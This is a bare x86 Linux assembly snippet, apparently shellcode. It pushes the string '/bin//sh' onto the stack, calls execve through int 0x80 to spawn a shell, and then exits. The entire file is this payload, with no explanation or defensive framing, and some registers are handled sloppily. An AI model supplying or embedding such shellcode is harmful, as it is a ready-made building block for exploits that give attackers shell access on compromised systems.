
global _start


_start:
	push 6845231
	push 1852400175
	xor edx,edx
	xor ecx,ecx
	xor edx,edx
	mov ebx,esp
	mov al,0xb
	int 0x80

	xor al,al
	inc al
	int 0x80
  
